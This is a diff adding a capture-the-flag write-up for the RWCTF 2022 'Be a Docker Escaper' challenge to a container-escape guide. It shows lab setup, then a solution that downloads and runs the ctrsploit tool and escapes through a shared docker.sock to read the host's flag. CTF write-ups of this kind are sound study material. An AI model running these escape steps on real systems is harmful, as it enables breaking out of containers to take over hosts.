@@ -194,3 +194,31 @@ root         839     816  0 06:57 pts/0    00:00:00 ps -ef
 
 ## 6. case
 
+### 6.1 RWCTF 2022: Be a Docker Escaper
+
+![](be-a-docker-escaper.svg)
+
+#### (1) Challenge Description
+
+#### (2) Env
+
+```shell
+$ git clone https://github.com/ssst0n3/docker_archive.git
+$ cd  docker_archive/ctf/Be-a-Docker-Escaper
+$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
+```
+
+#### (3) Solution
+
+```shell
+$ sshpass -p ctf ssh -o StrictHostKeyChecking=no -p 25115 ctf@127.0.0.1
+/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+/ # chmod +x /usr/bin/ctrsploit
+/ # ctrsploit vul shared-socket docker.sock c
+[Y]  docker.sock	# escape by shared docker socket
+
+/ # ctrsploit vul shared-socket docker.sock x
+# cat /root/flag
+cat /root/flag
+rwctf{THIS_IS_A_TEST_FLAG}
+```
